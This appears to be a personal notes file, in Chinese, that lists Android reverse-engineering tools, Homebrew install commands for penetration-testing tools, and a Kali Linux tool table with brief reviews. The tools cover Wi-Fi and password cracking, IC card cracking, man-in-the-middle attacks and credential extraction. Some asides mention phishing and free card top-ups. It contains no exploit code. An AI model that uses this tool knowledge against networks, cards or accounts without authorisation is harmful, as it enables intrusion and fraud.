+https://github.com/google/android-classyshark/
+https://ibotpeaches.github.io/Apktool/
+https://ibotpeaches.github.io/Apktool/install/
+https://github.com/pxb1988/dex2jar
+
+APK Messenger 是一款电脑端APK信息文件提取工具
+https://www.ghpym.com/apkinfo.html
+APK改之理
+https://www.zdfans.com/html/4991.html
+固件下载
+https://www.znds.com/rom/special/384295_341.html
+
+Android Apk查壳工具及源代码
+https://github.com/Andy10101/ApkDetecter
+APK查壳工具PKID
+https://xz.aliyun.com/t/2095
+Apk脱壳工具
+https://www.freebuf.com/sectool/105147.html
+https://github.com/WrBug/dumpDex
+https://github.com/WrBug/DeveloperHelper
+https://github.com/WrBug/DeveloperHelper/releases
+https://github.com/smartdone/dexdump
+https://github.com/DrizzleRisk/drizzleDumper
+
+git clone https://github.com/mwrlabs/drozer/
+cd drozer
+python setup.py bdist_wheel
+sudo pip install dist/drozer-2.x.x-py2-none-any.whl
+
+pip install -U androguard
+https://github.com/androguard/androguard
+
+pip install frida-tools # CLI tools
+pip install frida       # Python bindings
+npm install frida       # Node.js bindings
+pip3 install colorama prompt-toolkit pygments
+https://github.com/frida/frida
+
+https://github.com/MobSF/Mobile-Security-Framework-MobSF
+https://github.com/ac-pm/Inspeckage
+
+https://me.csdn.net/Eastmount
+
+Lynis 是安全审计、合规性测试和系统强化的强大工具。当然，你也可以将其用于漏洞检测和渗透测试。
+brew install lynis
+brew install wpscan
+brew install aircrack-ng
+brew install reaver
+brew install maltego
+brew install metasploit
+brew install proxychains-ng
+brew install hashcat
+brew install bettercap
+brew install nikto
+brew install httrack
+brew install sqlmap
+brew install john
+brew install ncrack
+brew install hydra
+brew install ophcrack
+brew install chirp #各种无线电数据包的拦截工具
+brew install apktool
+brew install dex2jar
+brew install jad
+brew install hashdeep
+brew install foremost #文件恢复
+
+brew cask install wireshark
+brew cask install zenmap
+brew cask install burp-suite
+
+https://github.com/spinkham/skipfish
+snmpwalk
+https://github.com/secdev/scapy
+pip3 install scapy
+
+https://www.kali.org/downloads/
+https://tools.kali.org/tools-listing
+https://blog.csdn.net/qq_26090065/article/details/81557600
+名称	类型	使用模式	功能	功能评价
+dmitry	信息收集	 	whois查询/子域名收集/端口扫描	whois并不简单明了；子域名和邮箱依赖google；端口扫描速度一般
+dnmap	信息收集	 	用于组建分布式nmap，dnmap_server为服务端；dnmap_client为客户端	用起来并不是那么方便，不是实在不行不是很必要
+ike-scan	信息收集	 	收集ipsec vpn server指纹信息	好像用于攻击vpn，不太懂
+maltegoce	信息收集	 gui	域名/账号等关联性收集展示	关联性展示功能确实很好，但效果可能没有那么理想，特别是对国内而言
+netdiscover	信息收集	 	主动发出arp包和截获arp包	就arp探测功能就此功能本身而言做得算很好了
+nmap	信息收集	cmd-line 	端口服务探测和端口漏洞扫描	端口扫描集大成者
+p0f	信息收集	 cmd-line	监听网卡收发的数据包，从数据包中读取远端机器操作系统服务版本等信息	毕竟只是截取数据 包中的版本信息，效果期望不要很大
+regon-ng	信息收集	 shell	模仿msf的信息侦查框架	类似将站长工具等东西命令行化，想法挺好但是用起来感觉不是那么直观
+sparta	暴力破解	 gui	图形版的hydra，加了端口服务扫描功能	还行图形界面聊胜于无
+zenmap	信息收集	 gui	图形界面版的nmap	还行图形界面聊胜于无
+golismero	web扫描	 cmd-line	就是一个文本版的类似awvs的web扫描器	感觉可以提升对扫描器原理的认识
+lynis	系统审计	 	感觉有点像360首页的“立即体验”，不过只是扫描告警不能一键修复	shell脚本写成颇为有趣
+nikto	web扫描	 	web扫描器	就喜欢这种直接告漏洞的扫描器（不过事实上很少能有可用的漏洞）
+unix-privesc-check	系统审计	 	审计系统中的关键文件权限是否有异常	还是没有总结性展示和修复功能
+bed	系统扫描	 	通过发送各种模糊数据测试多种服务的缓冲区溢出漏洞的工具	可能还不错
+burpsuite	web代理	 	 常用web代理截包工具	功能强大不能要求更多
+commix	注入检测	 	 sqlmap检测sql注入此工具检测系统命令注入	 两相搭配那注入基本覆盖了
+httrack	网站克隆	 	 将网站克隆到本地	 钓鱼乌云等可能有用
+owasp-zap	web代理	 gui	 owasp组织开发的工具	和burpsuite相比弱化了截包功能，强化了web漏洞扫描功能，不过感觉也没扫出什么东西
+paros	web扫描	 gui	 一个web爬行和漏扫工具	和owasp-zap差不多
+skipfish	web扫描	cmd-line	一个全自动化的web漏洞扫描工具	其工作一是爬行网站页面，然后分析页面漏洞，最后生html报告
+sqlmap	sql注入扫描	cmd-line	一个强大的sql注入扫描工具
+w3af	web扫描	shell/gui	一个web漏洞扫描框架	所谓框架就是有一堆扫描模块，然后你选定其中一些模块去扫描网站；感觉一般没说的那么好
+webscarab	http代理	 gui	更专业的网站树型结构分析工具
+wpscan	web扫描	 	针对wordpress的漏洞扫描工具
+bbqsql	盲注扫描	shell	 一个高度可配置的交互式的sql盲注工具
+hexorbase	数据库管理	gui	 一个支持多种数据库的客户端有多个数据库的口令破解功能	 作为客户端只能将就着用。暴破口令需要自己准备字典
+jsql	数据库探测	gui	根据url探测数据库类型/参数注入测试/探测后台页而/探测重要文件
+mdb-sql	数据库管理	cmd-line	可用来连接access数据库文件（mdb）然后通过sql语句查询数据
+oscaner	数据库猜解	cmd-line	用字典探查oracle数据库是否监听及猜解服务名	 参数很少。测试sid和默认用户是可以的，默认的字典基本没法看还是得自己写字典
+sidguesser	数据库猜解	 cmd-line	 用字典探测oracle数据库存在的sid	 参数很少。测试验证如果字典里有sid，可以探测出sid。基于字典的工具还是得自己准备字典
+sqllite database	数据库管理	gui	sqlite数据库客户端
+sqlinja	数据库猜解	cmd-line	用于猜解ms sql
+sqlsus	sql注入检测	 cmd-line	用于mysql的盲注检测
+tnscmd10g	数据库探测	 cmd-line	 用于探测oracle是否监听及其他一些信息
+cewl	口令文件制作	cmd-line 	爬取给定的URL并依据限制条件截取网页中的单词生成口令集合	 这种想法是可取的。但有点遗憾只是截取网页中的单词，没有a转@等等智能变换
+crunch	口令文件制作	cmd-line	依据限定的条件生成口令集合
+hashcat	hash爆破	cmd-line	多种hash的爆力猜解工具，速度快所耗CPU小（相对）
+john	系统口令破解	cmd-line	用于对系统口令文件的破解（如/etc/passwd）还原出密码明文
+johnny	系统口令破解	gui	john的gui版本
+medusa	口令猜解	cmd-line	可对IMAP, rlogin, SSH等进行口令猜解，类似hydra
+ncrack	口令猜解	cmd-line	可对IMAP, rlogin, SSH等进行口令猜解，类似hydra
+ophcrack	系统口令破解	gui	基于彩虹表的windows口令破解工具
+pyrit	wifi破解	cmd-line	WPA/WPA2加密的wifi的密码破解工具
+rainbowcrack	hash破解	cmd-line	具有彩虹表的生成、排序和使用排序好换彩虹表进行破解的功能
+rcracki_mt	hash破解	cmd-line	基于彩虹表的hash破解工具，可能蚲rainbowcrack一部份
+wordlist	口令文件	cmd-line	打印kali自带的一些口令文件存放的位置
+aircrack-ng	 wifi破解	 cmd-line	 针对WEP、 WPA加密方式的wifi密码破解套件
+chirp	无线电拦截	gui	各种无线电数据包的拦截工具（？）
+cowpatty	 wifi破解	 cmd-line	 基于已捕获握手包和密码字典的WPA-PSK加密的wifi密码的猜解	 不能自己拦截数据包也只能破解WPA-PSK类加密方式功能有点弱
+ Fern WIFI Cracker	 wifi破解	 gui	基于字典的WEP和WPA加密的wifi破解工具	 能自动发现wifi能拦截数据包，图形界面操作，简单易用
+ Ghost Phiser	 AP假冒	 gui	 能发现AP并使与AP连接的设备断开连接然后假冒AP让设备重新连接	 图形界面除了AP外还有假冒DNS、http服务器等，较为好用
+ giskismet	 可视化	 gui	 Kismet输出结果的可视化工具，即较成text、html等各种格式
+ kismet	 AP发现	 shell	 交互式的AP发现工具，列出周围AP的各种信息
+MDK3	 AP扰乱	 cmd-line	 可向AP发送大量连接、断开请求，可向周围设备告知存在根本不存在的大量AP	 这工具的攻击方法简直是发了疯
+mfor	IC卡破解	cmd-line	IC卡密钥破解程序	各种免费吃饭充钱教程里用的工具你想不想学
+mfterm	IC卡破解	shell	交互式IC卡文件写入工具	要修改卡内数据才是最终的IC卡破解
+pixiewps	wifi破解	cmd-line	针对开启WPS的wifi利用WPS随机数生成中的bug来破解	有说很快有说成功率比较低
+reaver	wifi破解	cmd-line	针对开启WPS的wifi进行暴力破解的工具	aircrack-ng后排名第二的wifi破解工具
+wifite	wifi破解	cmd-line	较为自动化的wifi破解工具
+apktool	安卓逆向	cmd-line	从apk文件中还原出xml和图版等资源文件
+clang	编译器	cmd-line	类似gcc的编译器，更轻量，可编译c、c++、Objective-C
+clang++	编译器	cmd-line	C++编译器，与clang的关系类似gcc和g++的类系
+ dex2jar	 安卓逆向	 cmd-line	 apktool把apk还原成了资源文件和dex，dex2jar把dex还原成jar文件（.class）
+edb-debug	动态调试	gui	软件逆向动态调试工具	Linux版Ollydbg
+flashm	反汇编	cmd-line	.swf文件的反汇编工具可反汇编出.swf中的脚本代码
+jad	反编译	cmd-line	dex2jar把文件还原成了.class，jad进一步把文件还原成.java文件
+javasnoop	fuzz	gui	java程序漏洞评估工具
+nasm shell	汇编	shell	nasm是32位汇编编译器，这是一个nasm的shell
+ollydbg	动态调试	gui	windows平台大名鼎鼎的动态调试工具，Linux上是通过wine运行有点水土不服
+radare2	静态分析	cmd-line	类似ida的静态反汇编分析工具，功能强大，开源	但是命令行操作这难度有点大
+armitage	 漏洞利用	 gui	 measploit的gui界面	 嗯好像是比原来的msf-gui好点，不过叫人自己去启动msf还要登录，还是不用算了
+ beef	 漏洞利用	 cmd-line	 利用msf的exp结合xss构造有攻击性的html页面，当浏览器访问即会受到攻击并获取shell	 这可以啊，不过不懂对现在浏览器效果怎么样
+ metasploit	 漏洞利用	 shell	 就是启动msfconsole咯
+msf payload center	漏洞利用	cmd-line	生成包含exp的windows/android等各平台的可执行文件，木马制作利器	那这东西和msfvenom的区别是什么
+ searchsploit	 漏洞利用	 cmd-line	 用于搜索已从exploitdb下载到本地的漏洞利用脚本	 可以理解msf都是ruby写的可执行代码，exploit不一定用ruby写，也可能只是扫描述而非代码
+ Social-Engineering	 漏洞利用	 shell	 一般用于生成各种插入了exp的文件，诱使目标打开而中招	 社会工程学总说得很厉害，不过我总觉得社会工程学和DDOS就是最名不副实的
+ termineter	 漏洞利用	 shell	 智能电表攻击框架	 这需要硬件搭配吧，没玩过
+ bdfproxy	 中间人攻击	 	 处于中间人身份时可对经过的流量插入payload
+ driftnet	 图版嗅探	 cmd-line	 用于嗅探流量中的图版并展示到x-window上	 配上arp欺骗作为中间人才能发挥威力，自己拦自己的就好玩而已
+ ettercap	 流量拦截	 gui	 听说可以截持同子网的流量，强无敌，原理是什么
+ hampster	 代理	 cmd-line	 好像也是代理转发流量的
+ macchanger	 mac欺骗	 cmd-line	 修改本机上网时的mac地址，一用作身份隐藏，二可用来绕过wifi mac黑名单	 应该只是软修改mac地址不可能可写吧
+ mitmproxy	 代理	 cmd-line	 好像也是代理转发流量的	 感觉没什么特色啊
+netsniff-ng	流量捕获	cmd-line	高性能的流量捕获套件，可能大流量时的捕获效果比较稳定
+responder	主机嗅探	cmd-line	被动嗅探与所在主机交互的主机的操作系统版本等信息
+wireshark	流量捕获	gui	拦截经过指定网卡的所有流量	sectools常年排行第一的工具，这就不用多说了吧
+backdoor
+exe2hex	编码转换	cmd	顾名思义就是把exe文件转成十六进制文件	不过这样的意义是什么，不是以十六进制就能打开了吗
+Intersect	脚本生成	shell	感觉是SQL 有攻击性Intersect语句的生成工具
+mimikatz	密码提取	cmd-line	用于从windows内存中提取密码
+nishang	后渗透	cmd-line	基于powershell的后渗透攻击工具
+PowerSploit	后渗透	cmd-line	也是一个基于powershell的后渗透攻击工具
+proxychains	多重代理	cmd-line	好像用来配置多种代理的
+weevely	webshell	shell	webshell连接工具不过好像要用自己生成的小马
+ autopsy	网页分析	 web	 启动一个服务通过浏览器访问使用，感觉是分析网页各种元素的不是很懂
+ binwalk	文件识别	 cmd-line	 用于分析一个文件中是否其实有多个文件	 ctf的key文件提取就常用到的
+bulk_extractor	要素提取	cmd-line	扫描给定的目录或文件，如果发现一些如电话号码网址等关键的信息则输出到文件
+chkrootkit	系统检查	cmd-line	扫描本机，查看本机是否存在受rootkit影响的地方	理解成360的木马查杀也差不多
+foremost	文件恢复	cmd-line	文件恢复工具，用于被删除的文件的恢复，就是360等的那个文件恢复功能
+galleta	cookie文件	cmd-line	用于分析IE的cookie文件输出其中的有用信息
+ hashdeep	hash计算	 cmd-line	 用于计算文件hash值，支持多种散列算法
+ volafox	 内存分析	 cmd-line	 针对Mac OS X的内存分析工具，可从其内存镜像中读取进程列表等各种主机信息	 先用工具把当前内存抓取下来，然后再用来分析；内存数据容易被破坏所以这确实很有意义
+ volatility	 内存分析	 cmd-line	 volafox的扩展，支持Mac OS X/Linux/Windows
+casefile	报告编写	gui	一个画图工具，packet tracer用来画网络拓扑，这用来画场景拓扑	这写出高大上的报告啊
+cutycapt	网页截屏	cmd-line	一个基于WebKit内核的网页截图工具，就是指定一个url它就能用解析url并把url界面截下来	各种扫描器中的截图就是使用类似的工具完成的，并不会真用个浏览器访问再截图下来
+dradis	报告生成	web	可解析burpsuite/nmap等生成的扫描文件，并可将扫描结果转存为pdf或html
+faraday IDE	报告管理	gui
+keepnote	笔记本	gui	较之记事本，可建文件夹，支持富文本，可导出为其他格式
+magictree	报告管理	gui
+pipal	词频统计	cmd-line	说词频统计并不是很准确，文命令可分析统计给定文件中的词语的“各种最”
+recordmydesktop	屏幕录制	cmd-line	屏幕录制，输出.ogv格式视频	不过感觉这视频格式占用磁盘有点大啊
+maltegoce	关系分析	gui	通过网络搜索，获取某个IP或邮箱与其他IP或邮箱的拓扑关系	这东西有那么强，但社工的东西还是没那么强，而且还是外国的工具在天朝的网络
+
+https://blackarch.org/downloads.html
+https://blackarch.org/tools.html
+
+mdk3
+https://redneno.me/2019/mdk3-wireless-attack/
+https://redneno.me/2019/arp-attack-in-kali-linux/
+
+https://blog.csdn.net/qq_37806908/article/details/95463919
+https://github.com/whywilson/mtools
+https://why.yuyeye.cc/mtools/zh/update_log.html
+https://blog.csdn.net/k183000860/article/details/65655709
+
+https://openwall.info/wiki/john/johnny
+https://github.com/shinnok/johnny
+https://openwall.info/wiki/_media/john/johnny/johnny_2.2_win.zip
+https://openwall.info/wiki/_media/john/johnny/johnny_2.2_osx.zip
